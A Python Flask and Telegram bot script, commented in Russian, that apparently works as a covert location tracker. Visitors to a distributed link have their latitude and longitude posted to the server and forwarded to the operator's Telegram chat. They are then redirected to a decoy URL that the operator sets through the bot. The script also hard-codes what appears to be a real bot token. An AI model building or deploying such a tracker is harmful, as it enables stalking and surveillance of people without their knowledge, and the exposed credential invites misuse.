from flask import Flask, request, send_from_directory, redirect
import telebot
from telebot import types
import os

app = Flask(__name__, static_folder='static')

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
CHAT_ID = 651911888  # Только ты можешь пользоваться ботом

bot = telebot.TeleBot(BOT_TOKEN)

# --- Переменные ---
RENDER_URL = 'https://geo-tracker-l5ui.onrender.com'  # Ссылка на твой сайт
redirect_url = "https://example.com"  # URL по умолчанию, на который редиректим после гео
user_waiting_for_url = set()  # Кто сейчас вводит новую ссылку

# --- Flask часть ---

@app.route("/")
def serve_index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route("/send_location", methods=["POST"])
def send_location():
    data = request.json
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat and lon:
        bot.send_message(CHAT_ID, f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}")
        return {"status": "ok"}
    return {"status": "error"}, 400

@app.route("/redirect")
def geo_redirect():
    return redirect(redirect_url)

# --- Bot часть ---

def set_redirect_url(url):
    global redirect_url
    redirect_url = url

def check_user(message):
    return message.chat.id == CHAT_ID

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not check_user(message):
        bot.reply_to(message, "🚫 Доступ запрещён.")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('Изменить редирект', 'Скинуть ссылку')
    bot.send_message(message.chat.id, "Выбери действие:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == 'Изменить редирект')
def ask_redirect(message):
    if not check_user(message):
        return
    bot.send_message(message.chat.id, "Пришли новую ссылку для редиректа (начиная с http:// или https://):")
    user_waiting_for_url.add(message.chat.id)

@bot.message_handler(func=lambda m: m.chat.id in user_waiting_for_url)
def set_redirect_from_message(message):
    if not check_user(message):
        return
    url = message.text.strip()
    if url.startswith('http://') or url.startswith('https://'):
        set_redirect_url(url)
        bot.send_message(message.chat.id, f"✅ Редирект установлен на:\n{url}")
        user_waiting_for_url.remove(message.chat.id)
    else:
        bot.send_message(message.chat.id, "❌ Ошибка: ссылка должна начинаться с http:// или https://. Попробуй ещё раз.")

@bot.message_handler(func=lambda m: m.text == 'Скинуть ссылку')
def send_render_link(message):
    if not check_user(message):
        return
    bot.send_message(message.chat.id, f"🌐 Вот твоя ссылка для рассылки:\n{RENDER_URL}")

# --- Webhook (если нужен) ---

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    update = telebot.types.Update.de_json(request.stream.read().decode("utf-8"))
    bot.process_new_updates([update])
    return "", 200

if __name__ == "__main__":
    # Убираем старый webhook, если был
    bot.remove_webhook()
    # Устанавливаем webhook на свой рендер
    bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")

    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
